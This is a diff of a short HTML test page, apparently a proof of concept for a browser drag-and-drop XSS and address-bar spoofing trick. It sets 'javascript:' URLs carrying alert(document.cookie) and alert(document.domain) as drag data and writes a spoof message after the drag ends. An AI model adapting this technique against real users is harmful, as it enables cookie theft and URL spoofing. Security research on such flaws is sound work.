@@ -1,24 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Drag XSS Test</title>
-</head>
+<title>
+test</title>
 <body>
+<h1><a href="javascript:alert('memek')" id="a">Mama im a criminal</a></h1>
+</body>
 
-<h2>Drag this to the address bar 👇</h2>
-
-<a href="#" draggable="true" id="dragme" style="padding:10px;background:red;color:white;cursor:grab;">
-  Drag me
-</a>
 
 <script>
-document.getElementById('dragme').ondragstart = function(e) {
-  e.dataTransfer.setData(
-    'text/plain',
-    'javascript:alert(document.cookie)'
-  );
-};
-</script>
-
-</body>
-</html>
+var spoof_url = 'alert(document.domain)';
+spoof_url = 'javascript:' + spoof_url;
+ondragstart= function() {
+  //event.dataTransfer.setData('text/plain','chrome://downloads/');
+  event.dataTransfer.setData('text/plain',spoof_url);
+}
+ondragend = function(){
+  document.title = 'Done';
+  document.write('<h1>I am not www.google.com at all!</h1>');
+}
